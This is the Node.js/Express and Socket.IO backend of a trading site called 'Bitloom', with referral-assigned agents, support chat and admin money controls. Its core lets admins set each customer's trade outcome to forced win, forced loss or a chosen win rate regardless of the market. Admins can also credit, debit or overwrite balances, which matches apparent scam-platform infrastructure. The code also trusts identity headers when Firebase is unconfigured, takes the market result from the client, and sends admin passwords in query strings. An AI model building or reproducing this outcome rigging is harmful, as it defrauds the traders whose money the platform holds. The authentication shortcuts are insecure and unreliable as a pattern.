const express          = require("express");
const { createServer } = require("http");
const { Server }       = require("socket.io");
const cors             = require("cors");
const path             = require("path");
require("dotenv").config({ path: path.join(__dirname, ".env") });

const {
  initFirebaseAdmin,
  isFirebaseReady,
  getFirebaseInitError,
  verifyIdToken,
} = require("./firebaseAdmin");
const money = require("./moneyService");
const { buildAdmins, createAdminHelpers } = require("./admins");

initFirebaseAdmin();

const app = express();
const IS_VERCEL = !!process.env.VERCEL;

const FRONTEND_ORIGINS = (process.env.FRONTEND_ORIGIN || "http://localhost:5173,http://127.0.0.1:5173")
  .split(",")
  .map((s) => s.trim())
  .filter(Boolean);

const PORT = process.env.PORT || 3001;

function isAllowedOrigin(origin) {
  if (!origin) return true;
  if (FRONTEND_ORIGINS.includes(origin)) return true;
  // Local / LAN browsers during development
  if (/^https?:\/\/(localhost|127\.0\.0\.1)(:\d+)?$/i.test(origin)) return true;
  return false;
}

// On Vercel, reflect request origin (same-site frontend + API). Locally, allow configured + localhost variants.
app.use(cors({
  origin: IS_VERCEL ? true : (origin, cb) => cb(null, isAllowedOrigin(origin) ? origin || true : false),
  credentials: true,
}));
app.use(express.json());

const httpServer = IS_VERCEL ? null : createServer(app);
const io = IS_VERCEL
  ? null
  : new Server(httpServer, {
      cors: {
        origin: (origin, cb) => cb(null, isAllowedOrigin(origin)),
        methods: ["GET", "POST"],
        credentials: true,
      },
      transports: ["websocket", "polling"],
    });

// ─── ADMIN ACCOUNTS ───────────────────────────────────────────────────────────
// Up to 15 accounts via env (ADMIN_MAIN_* + ADMIN_2_* … ADMIN_15_*).
// Main = full access. Limited = only their referral customers + their chats.
const ADMINS = buildAdmins();
const {
  authAdmin,
  isMainAdmin,
  getAdmin,
  findAdminByCode,
  listAdminsPublic,
  adminCount,
  resolveLogin,
} = createAdminHelpers(ADMINS);

// ─── STATE ────────────────────────────────────────────────────────────────────
// sessions: Map<sessionId, { id, name, socketId, messages[], status, createdAt, readByAgent, assignedAdmin }>
const sessions = new Map();

// adminSockets: Map<socketId, adminUsername>
const adminSockets = new Map();

// customerSockets: Map<socketId, email> — a signed-in trader's live connection,
// so an outcome change can be pushed to that one person and nobody else.
const customerSockets = new Map();

// ─── P&L HELPERS ─────────────────────────────────────────────────────────────
// An outcome override lives on the customer's own account, so it decides that
// person's trades and nobody else's. "auto" — the default for every new
// account — lets the real market price decide.
function resolveOutcome(marketWon, config) {
  switch (config.mode) {
    case "win":    return true;
    case "loss":   return false;
    case "custom": return Math.random() * 100 < config.customWinRate;
    default:       return marketWon;
  }
}

const DEFAULT_PNL = { mode: "auto", customWinRate: 50 };

async function getUserPnlSafe(uid) {
  try {
    return await money.getUserPnl(uid);
  } catch {
    return DEFAULT_PNL;
  }
}

// ─── HELPERS ──────────────────────────────────────────────────────────────────
function makeMsg(from, text, extra = {}) {
  return { id: Date.now() + Math.random(), from, text, time: new Date().toISOString(), ...extra };
}

function notifyAllAdmins(event, data) {
  if (!io) return;
  adminSockets.forEach((_, sid) => {
    const s = io.sockets.sockets.get(sid);
    if (s) s.emit(event, data);
  });
}

/** Notify only the assigned admin + main admins (oversight). */
function notifyRelevantAdmins(event, data, assignedAdmin) {
  if (!io) return;
  adminSockets.forEach((adminName, sid) => {
    if (assignedAdmin && adminName !== assignedAdmin && !isMainAdmin(adminName)) return;
    const s = io.sockets.sockets.get(sid);
    if (s) s.emit(event, data);
  });
}

function addAdminsToRoom(sessionId, assignedAdmin = null) {
  if (!io) return;
  adminSockets.forEach((adminName, sid) => {
    if (assignedAdmin && adminName !== assignedAdmin && !isMainAdmin(adminName)) return;
    const s = io.sockets.sockets.get(sid);
    if (s) s.join(sessionId);
  });
}

function sessionsVisibleTo(username) {
  const all = Array.from(sessions.values());
  if (isMainAdmin(username)) return all;
  return all.filter((s) => s.assignedAdmin === username);
}

/** Limited admins may only manage customers who signed up with their referral code. */
async function assertOwnsCustomer(adminUsername, email) {
  if (isMainAdmin(adminUsername)) return;
  const user = await money.findUserByEmail(email);
  if (user.referredBy !== adminUsername) {
    const err = new Error("This customer is not assigned to your referral code");
    err.status = 403;
    throw err;
  }
}

// Push an outcome config to one customer's own sockets — never a broadcast.
function pushPnlToCustomer(email, config) {
  if (!io) return;
  const target = String(email || "").trim().toLowerCase();
  if (!target) return;
  customerSockets.forEach((mail, sid) => {
    if (mail !== target) return;
    const s = io.sockets.sockets.get(sid);
    if (s) s.emit("pnl:mode", config);
  });
}

// ═══════════════════════════════════════════════════════════════════════════════
//  REST API
// ═══════════════════════════════════════════════════════════════════════════════

app.get("/api/health", (_req, res) => res.json({
  status: "ok",
  moneyStore: money.backendMode(),
  firebase: isFirebaseReady(),
  firebaseError: getFirebaseInitError(),
}));

function asyncHandler(fn) {
  return (req, res) => Promise.resolve(fn(req, res)).catch((err) => {
    const status = err.status || 500;
    res.status(status).json({ error: err.message || "Server error" });
  });
}

/** Customer auth: Firebase ID token, or (dev) uid+email in body/headers when Admin SDK missing */
async function requireCustomer(req, _res, next) {
  try {
    if (isFirebaseReady() && req.headers.authorization?.startsWith("Bearer ")) {
      const decoded = await verifyIdToken(req.headers.authorization);
      req.user = {
        uid: decoded.uid,
        email: decoded.email || "",
        displayName: decoded.name || "",
      };
      return next();
    }
    const uid = req.headers["x-user-uid"] || req.body?.uid || req.query?.uid;
    const email = req.headers["x-user-email"] || req.body?.email || req.query?.email;
    if (uid && email) {
      req.user = { uid: String(uid), email: String(email), displayName: "" };
      return next();
    }
    return _res.status(401).json({
      error: isFirebaseReady()
        ? "Sign in required"
        : "Sign in required (send Bearer token, or x-user-uid + x-user-email while Firebase Admin is not configured)",
    });
  } catch (err) {
    return _res.status(err.status || 401).json({ error: err.message || "Unauthorized" });
  }
}

function requireAdmin(req, res) {
  const username = req.body?.username || req.query?.username;
  const password = req.body?.password || req.query?.password;
  if (!authAdmin(username, password)) {
    res.status(401).json({ error: "Unauthorized" });
    return null;
  }
  return username;
}

// Customer profile + balance
app.get("/api/me", requireCustomer, asyncHandler(async (req, res) => {
  const profile = await money.ensureUserDoc(req.user.uid, {
    email: req.user.email,
    displayName: req.user.displayName,
  });
  res.json({
    uid: req.user.uid,
    email: profile.email || req.user.email,
    displayName: profile.displayName || req.user.displayName,
    balance: Number(profile.balance) || 0,
    frozen: !!profile.frozen,
    referredBy: profile.referredBy || null,
    referralCode: profile.referralCode || null,
    needsReferral: !profile.referredBy,
    store: money.backendMode(),
  });
}));

// Validate a referral / invite code (public — needed before signup)
app.get("/api/referral/check", asyncHandler(async (req, res) => {
  const code = String(req.query.code || "").trim();
  const admin = findAdminByCode(code);
  if (!admin) return res.status(404).json({ valid: false, error: "Invalid referral code" });
  res.json({ valid: true, code: admin.code });
}));

// Bind the signed-in customer to an admin via mandatory referral code (once)
app.post("/api/auth/bind-referral", requireCustomer, asyncHandler(async (req, res) => {
  const admin = findAdminByCode(req.body?.code);
  if (!admin) return res.status(400).json({ error: "Invalid referral code" });
  await money.ensureUserDoc(req.user.uid, {
    email: req.user.email,
    displayName: req.user.displayName,
  });
  const result = await money.bindReferral(req.user.uid, {
    code: admin.code,
    adminUsername: admin.username,
  });
  res.json({ success: true, ...result });
}));

// Open trade — deduct stake if balance allows
app.post("/api/trade/open", requireCustomer, asyncHandler(async (req, res) => {
  await money.ensureUserDoc(req.user.uid, { email: req.user.email, displayName: req.user.displayName });
  const result = await money.openTrade({
    uid: req.user.uid,
    email: req.user.email,
    amount: req.body.amount,
    pct: req.body.pct,
    symbol: req.body.symbol || "BTCUSDT",
    side: req.body.side || "buy",
    sessionId: req.body.sessionId || null,
  });
  res.json(result);
}));

// Admin login — username or email for main; returns canonical username
app.post("/api/admin/login", (req, res) => {
  const { username, password } = req.body;
  if (!authAdmin(username, password))
    return res.status(401).json({ error: "Invalid credentials" });
  const canonical = resolveLogin(username);
  const meta = getAdmin(canonical);
  res.json({
    success: true,
    username: canonical,
    isMain: isMainAdmin(canonical),
    code: meta?.code || null,
    role: isMainAdmin(canonical) ? "main" : "limited",
  });
});

// Main admin: list all configured admin accounts + referral codes
app.get("/api/admin/team", asyncHandler(async (req, res) => {
  const username = requireMainAdmin(req, res);
  if (!username) return;
  res.json({ admins: listAdminsPublic(), count: adminCount() });
}));

// Any logged-in admin can see their own referral code
app.get("/api/admin/my-code", asyncHandler(async (req, res) => {
  const username = requireAdmin(req, res);
  if (!username) return;
  const meta = getAdmin(username);
  res.json({
    username,
    code: meta?.code || null,
    role: isMainAdmin(username) ? "main" : "limited",
    isMain: isMainAdmin(username),
  });
}));

// A customer reads their own outcome mode — used only for the live
// winning/losing indicator while a trade runs.
app.get("/api/my-pnl", requireCustomer, asyncHandler(async (req, res) => {
  await money.ensureUserDoc(req.user.uid, { email: req.user.email });
  res.json(await getUserPnlSafe(req.user.uid));
}));

// Trade resolution — P&L mode + balance settle
app.post("/api/trade/resolve", requireCustomer, asyncHandler(async (req, res) => {
  const { marketWon, amount, pct, sessionId, tradeId } = req.body;
  if (typeof marketWon !== "boolean")
    return res.status(400).json({ error: "marketWon (bool) required" });

  const session   = sessions.get(sessionId);
  const adminName = session?.assignedAdmin || null;
  // The override that decides this trade belongs to the trader, not the admin
  // who happens to be handling their chat.
  const config    = await getUserPnlSafe(req.user.uid);
  const won       = resolveOutcome(marketWon, config);

  if (tradeId) {
    const settled = await money.settleTrade({
      tradeId,
      uid: req.user.uid,
      marketWon,
      wonOverride: won,
      assignedAdmin: adminName,
    });
    return res.json({
      won: settled.won,
      pnl: settled.pnl,
      balance: settled.balance,
      mode: config.mode,
      assignedAdmin: adminName,
      trade: settled.trade,
    });
  }

  // Legacy path (no open tradeId): compute PnL only — do not mutate balance here
  if (!amount || !pct)
    return res.status(400).json({ error: "tradeId required (or legacy amount+pct for display-only)" });
  const pnl = won ? amount * (pct / 100) : -amount;
  res.json({ won, pnl, mode: config.mode, assignedAdmin: adminName, legacy: true });
}));

// ── Admin money controls ─────────────────────────────────────────────────────
app.post("/api/admin/users/credit", asyncHandler(async (req, res) => {
  const username = requireAdmin(req, res);
  if (!username) return;
  await assertOwnsCustomer(username, req.body.email);
  const result = await money.creditByEmail(req.body.email, req.body.amount, {
    adminId: username,
    note: req.body.note || "Manual deposit credit",
  });
  res.json({ success: true, ...result });
}));

app.post("/api/admin/users/debit", asyncHandler(async (req, res) => {
  const username = requireAdmin(req, res);
  if (!username) return;
  await assertOwnsCustomer(username, req.body.email);
  const result = await money.debitByEmail(req.body.email, req.body.amount, {
    adminId: username,
    note: req.body.note || "Manual debit",
  });
  res.json({ success: true, ...result });
}));

app.post("/api/admin/users/set-balance", asyncHandler(async (req, res) => {
  const username = requireAdmin(req, res);
  if (!username) return;
  await assertOwnsCustomer(username, req.body.email);
  const result = await money.setBalanceByEmail(req.body.email, req.body.amount, {
    adminId: username,
    note: req.body.note || "Balance set by admin",
  });
  res.json({ success: true, ...result });
}));

// Set ONE customer's trade outcome, found by their email. Nobody else is touched.
app.post("/api/admin/users/pnl", asyncHandler(async (req, res) => {
  const username = requireAdmin(req, res);
  if (!username) return;
  await assertOwnsCustomer(username, req.body.email);
  const result = await money.setPnlByEmail(
    req.body.email,
    { mode: req.body.mode, customWinRate: req.body.customWinRate },
    { adminId: username },
  );
  pushPnlToCustomer(result.email, { mode: result.mode, customWinRate: result.customWinRate });
  console.log(`[PnL] ${username} → ${result.email} = ${result.mode}`);
  res.json({ success: true, ...result });
}));

// Every account currently overridden, so an admin can see exactly who is affected.
app.get("/api/admin/pnl-overrides", asyncHandler(async (req, res) => {
  const username = requireAdmin(req, res);
  if (!username) return;
  let users = await money.listPnlOverrides();
  if (!isMainAdmin(username)) {
    users = users.filter((u) => u.referredBy === username);
  }
  res.json({ users });
}));

app.post("/api/admin/users/freeze", asyncHandler(async (req, res) => {
  const username = requireAdmin(req, res);
  if (!username) return;
  await assertOwnsCustomer(username, req.body.email);
  const result = await money.freezeByEmail(req.body.email, !!req.body.frozen, { adminId: username });
  res.json({ success: true, ...result });
}));

// ── Owner oversight: what every admin has been doing ─────────────────────────
function requireMainAdmin(req, res) {
  const username = req.body?.username || req.query?.username;
  const password = req.body?.password || req.query?.password;
  if (!authAdmin(username, password)) {
    res.status(401).json({ error: "Unauthorized" });
    return null;
  }
  if (!isMainAdmin(username)) {
    res.status(403).json({ error: "Main admin only" });
    return null;
  }
  return username;
}

app.get("/api/admin/oversight", asyncHandler(async (req, res) => {
  const username = requireMainAdmin(req, res);
  if (!username) return;

  const entries = await money.listRecentLedger(Number(req.query.limit) || 300);
  const allSessions = Array.from(sessions.values());

  const summary = Object.keys(ADMINS).map((name) => ({
    username: name,
    isMain: isMainAdmin(name),
    isYou: name === username,
    pnlChanges: 0,
    credited: 0,
    debited: 0,
    actions: 0,
    customers: [],
    lastActionAt: null,
    sessions: allSessions.filter((s) => s.assignedAdmin === name).length,
    recent: [],
  }));
  const byName = Object.fromEntries(summary.map((a) => [a.username, a]));

  for (const e of entries) {
    const admin = e.adminId && byName[e.adminId];
    if (!admin) continue;               // customer-driven rows (trades) have no adminId
    const amount = Number(e.amount) || 0;
    admin.actions += 1;
    if (e.type === "credit") admin.credited += amount;
    if (e.type === "debit") admin.debited += Math.abs(amount);
    if (e.type === "pnl_mode") admin.pnlChanges += 1;
    if (e.email && !admin.customers.includes(e.email)) admin.customers.push(e.email);
    if (!admin.lastActionAt || e.createdAt > admin.lastActionAt) admin.lastActionAt = e.createdAt;
    if (admin.recent.length < 25) {
      admin.recent.push({
        email: e.email || "",
        type: e.type,
        amount,
        balanceAfter: e.balanceAfter,
        note: e.note || "",
        createdAt: e.createdAt,
      });
    }
  }

  summary.forEach((a) => {
    a.credited = Math.round(a.credited * 100) / 100;
    a.debited = Math.round(a.debited * 100) / 100;
  });

  res.json({ mainAdmin: username, scanned: entries.length, admins: summary });
}));

app.get("/api/admin/users/search", asyncHandler(async (req, res) => {
  const username = requireAdmin(req, res);
  if (!username) return;
  await assertOwnsCustomer(username, req.query.email);
  const user = await money.findUserByEmail(req.query.email);
  const pnl = await getUserPnlSafe(user.uid);
  res.json({
    uid: user.uid,
    email: user.email,
    displayName: user.displayName || "",
    balance: Number(user.balance) || 0,
    frozen: !!user.frozen,
    referredBy: user.referredBy || null,
    referralCode: user.referralCode || null,
    pnlMode: pnl.mode,
    pnlWinRate: pnl.customWinRate,
  });
}));

app.get("/api/admin/ledger", asyncHandler(async (req, res) => {
  const username = requireAdmin(req, res);
  if (!username) return;
  await assertOwnsCustomer(username, req.query.email);
  const rows = await money.listLedgerByEmail(req.query.email, Number(req.query.limit) || 40);
  res.json(rows);
}));

// List chat sessions visible to this admin (main sees all; limited sees only theirs)
app.get("/api/admin/chats", (req, res) => {
  const { username, password } = req.query;
  if (!authAdmin(username, password))
    return res.status(401).json({ error: "Unauthorized" });
  res.json(sessionsVisibleTo(username));
});

// Admin stats — scoped for limited admins
app.get("/api/admin/stats", asyncHandler(async (req, res) => {
  const { username, password } = req.query;
  if (!authAdmin(username, password))
    return res.status(401).json({ error: "Unauthorized" });
  const visible = sessionsVisibleTo(username);
  const mine = visible.filter((s) => s.assignedAdmin === username);
  let pnlCount = (await money.listPnlOverrides()).length;
  if (!isMainAdmin(username)) {
    pnlCount = (await money.listPnlOverrides()).filter((u) => u.referredBy === username).length;
  }
  res.json({
    pnlOverrides:     pnlCount,
    totalSessions:    visible.length,
    pendingSessions:  visible.filter((s) => s.status === "pending").length,
    activeSessions:   visible.filter((s) => s.status === "active").length,
    mySessions:       mine.length,
    adminConnections: adminSockets.size,
    connectedClients: io ? io.engine.clientsCount : 0,
    moneyStore:       money.backendMode(),
    vercel:           IS_VERCEL,
    referralCode:     getAdmin(username)?.code || null,
    role:             isMainAdmin(username) ? "main" : "limited",
  });
}));

// ═══════════════════════════════════════════════════════════════════════════════
//  SOCKET.IO (local / always-on hosts only — not available on Vercel serverless)
// ═══════════════════════════════════════════════════════════════════════════════

if (io) io.on("connection", (socket) => {
  console.log("[Socket] Connected:", socket.id);

  // ── Admin auth ─────────────────────────────────────────────────────────────
  socket.on("admin:join", ({ username, password } = {}) => {
    if (!authAdmin(username, password)) return;
    const canonical = resolveLogin(username);
    adminSockets.set(socket.id, canonical);

    // Join only sessions this admin is allowed to see
    sessions.forEach((session, sid) => {
      if (isMainAdmin(canonical) || session.assignedAdmin === canonical) {
        socket.join(sid);
      }
    });

    socket.emit("admin:sessions", sessionsVisibleTo(canonical));
    socket.emit("admin:online", { online: true });
    // Customers only see "agent online" if THEIR assigned admin is online —
    // handled per-session on chat:start / rejoin.
    io.emit("agent:status", { online: adminSockets.size > 0 });
    console.log(`[Admin] ${canonical} joined (socket: ${socket.id}) | admins online: ${adminSockets.size}`);
  });

  // ── Customer: identify the signed-in trader on this socket ────────────────
  // Lets an outcome change reach exactly this person's browser, live.
  socket.on("user:join", async ({ uid, email } = {}) => {
    if (!email) return;
    customerSockets.set(socket.id, String(email).trim().toLowerCase());
    if (uid) socket.emit("pnl:mode", await getUserPnlSafe(String(uid)));
  });

  // ── Customer: rejoin existing session after reconnect ─────────────────────
  socket.on("chat:rejoin", ({ sessionId } = {}) => {
    const session = sessions.get(sessionId);
    if (!session) { socket.emit("chat:session-expired"); return; }
    session.socketId = socket.id;
    socket.join(sessionId);
    addAdminsToRoom(sessionId, session.assignedAdmin);
    socket.emit("chat:session", { sessionId, messages: session.messages });
    let online = false;
    adminSockets.forEach((name) => {
      if (name === session.assignedAdmin || isMainAdmin(name)) online = true;
    });
    socket.emit("agent:status", { online });
  });

  // ── Customer: start session (signed-in; routed to referral admin or main) ──
  socket.on("chat:start", async ({ name, token } = {}) => {
    try {
      if (!token) {
        socket.emit("chat:error", { error: "Sign in required to chat with support" });
        return;
      }
      const decoded = await verifyIdToken(token);
      const profile = await money.ensureUserDoc(decoded.uid, {
        email: decoded.email,
        displayName: decoded.name || decoded.displayName || "",
      });

      // Referral customers → their agent. Others (legacy / no code) → main admin.
      let assignedAdmin = profile.referredBy || null;
      if (assignedAdmin && !getAdmin(assignedAdmin)) {
        assignedAdmin = null;
      }
      if (!assignedAdmin) {
        const mainName = Object.keys(ADMINS).find((u) => ADMINS[u].main);
        if (!mainName) {
          socket.emit("chat:error", { error: "Support is temporarily unavailable" });
          return;
        }
        assignedAdmin = mainName;
      }

      let agentOnline = false;
      adminSockets.forEach((adminName) => {
        if (adminName === assignedAdmin || isMainAdmin(adminName)) agentOnline = true;
      });

      const sessionId = `s-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`;
      const session = {
        id:            sessionId,
        socketId:      socket.id,
        name:          name?.trim() || profile.displayName || decoded.email || "Customer",
        email:         profile.email || decoded.email || "",
        uid:           decoded.uid,
        messages: [
          makeMsg("system", agentOnline
            ? "Welcome to Bitloom Support! Your agent will respond shortly."
            : "Welcome to Bitloom Support! Your agent is offline — leave a message and they will reply soon."),
        ],
        status:        "pending",
        createdAt:     new Date().toISOString(),
        readByAgent:   false,
        assignedAdmin,
      };

      sessions.set(sessionId, session);
      socket.join(sessionId);
      addAdminsToRoom(sessionId, assignedAdmin);
      socket.emit("chat:session", { sessionId, messages: session.messages });
      socket.emit("agent:status", { online: agentOnline });
      notifyRelevantAdmins("admin:new-session", session, assignedAdmin);
      console.log("[Chat] New session:", sessionId, "→ admin:", assignedAdmin, "from:", session.email);
    } catch (err) {
      console.error("[Chat] start failed:", err.message || err);
      socket.emit("chat:error", { error: err.message || "Could not start chat" });
    }
  });

  // ── Customer: send message ─────────────────────────────────────────────────
  socket.on("chat:message", ({ sessionId, text }) => {
    const session = sessions.get(sessionId);
    if (!session || !text?.trim()) return;
    io.to(sessionId).except(socket.id).emit("chat:typing", { from: "user", isTyping: false, sessionId });
    const msg = makeMsg("user", text.trim());
    session.messages.push(msg);
    session.readByAgent = false;
    io.to(sessionId).emit("chat:message", { ...msg, sessionId });
    notifyRelevantAdmins("admin:session-updated", { sessionId, session }, session.assignedAdmin);
  });

  // ── Customer: typing indicator ─────────────────────────────────────────────
  socket.on("chat:typing", ({ sessionId, isTyping }) => {
    const session = sessions.get(sessionId);
    if (!session) return;
    io.to(sessionId).except(socket.id).emit("chat:typing", { from: "user", isTyping, sessionId });
  });

  // ── Admin: send message — only assigned admin (or main) may reply ──────────
  socket.on("admin:message", ({ sessionId, text, username, password }) => {
    if (!authAdmin(username, password) || adminSockets.get(socket.id) !== username) return;
    const session = sessions.get(sessionId);
    if (!session || !text?.trim()) return;

    if (session.assignedAdmin && session.assignedAdmin !== username && !isMainAdmin(username)) {
      socket.emit("chat:error", { error: "This customer is assigned to another admin" });
      return;
    }

    io.to(sessionId).except(socket.id).emit("chat:typing", { from: "agent", isTyping: false });

    if (!session.assignedAdmin) {
      session.assignedAdmin = username;
      console.log(`[Chat] Session ${sessionId} assigned to ${username}`);
    }

    const msg = makeMsg("agent", text.trim());
    session.messages.push(msg);
    session.status = "active";
    io.to(sessionId).emit("chat:message", { ...msg, sessionId });
    notifyRelevantAdmins("admin:session-updated", { sessionId, session }, session.assignedAdmin);
  });

  // ── Admin: typing indicator ────────────────────────────────────────────────
  socket.on("admin:typing", ({ sessionId, isTyping, username, password }) => {
    if (!authAdmin(username, password)) return;
    const session = sessions.get(sessionId);
    if (!session) return;
    if (session.assignedAdmin && session.assignedAdmin !== username && !isMainAdmin(username)) return;
    socket.to(sessionId).emit("chat:typing", { from: "agent", isTyping });
  });

  // ── Admin: mark session as read ───────────────────────────────────────────
  socket.on("admin:read", ({ sessionId, username, password }) => {
    if (!authAdmin(username, password)) return;
    const session = sessions.get(sessionId);
    if (!session) return;
    if (session.assignedAdmin && session.assignedAdmin !== username && !isMainAdmin(username)) return;
    session.readByAgent = true;
    io.to(sessionId).emit("chat:read");
  });

  // ── Admin: close session ───────────────────────────────────────────────────
  socket.on("admin:close-session", ({ sessionId, username, password }) => {
    if (!authAdmin(username, password)) return;
    const session = sessions.get(sessionId);
    if (!session) return;
    if (session.assignedAdmin && session.assignedAdmin !== username && !isMainAdmin(username)) return;
    session.status = "closed";
    const msg = makeMsg("system", "This support session has been closed. Thank you for contacting Bitloom Support!");
    session.messages.push(msg);
    io.to(sessionId).emit("chat:message", { ...msg, sessionId });
    io.to(sessionId).emit("chat:closed");
    notifyRelevantAdmins("admin:session-updated", { sessionId, session }, session.assignedAdmin);
  });

  // ── Disconnect ─────────────────────────────────────────────────────────────
  socket.on("disconnect", () => {
    const wasAdmin = adminSockets.has(socket.id);
    adminSockets.delete(socket.id);
    customerSockets.delete(socket.id);
    if (wasAdmin && adminSockets.size === 0) {
      io.emit("agent:status", { online: false });
      console.log("[Admin] Last admin disconnected — customers notified");
    }
    console.log("[Socket] Disconnected:", socket.id);
  });
}); // end io.on connection

// ═══════════════════════════════════════════════════════════════════════════════
if (!IS_VERCEL && httpServer) {
  httpServer.listen(PORT, () => {
    console.log(`\n🚀 Bitloom Backend  →  http://localhost:${PORT}`);
    console.log(`📡 CORS origins   →  ${FRONTEND_ORIGINS.join(", ")}`);
    console.log(`💰 Money store    →  ${money.backendMode()}`);
    if (!isFirebaseReady()) {
      console.log("⚠️  Firebase Admin not configured — using local JSON store (backend/data/)");
      console.log("   Add backend/serviceAccountKey.json to switch to Firestore.");
    }
    const adminNames = Object.keys(ADMINS);
    if (adminNames.length === 0) {
      console.warn("\n⚠️  No admin accounts configured — set ADMIN_MAIN_USER / ADMIN_MAIN_PASS");
      console.warn("   in backend/.env (see backend/.env.example). Admin login is disabled.\n");
    } else {
      console.log("\nAdmin accounts:");
      adminNames.forEach((u) => {
        const a = ADMINS[u];
        console.log(`  ${u}  code=${a.code}${a.main ? "  (main · full access)" : "  (limited)"}`);
      });
      console.log("");
    }
  });
}

module.exports = app;
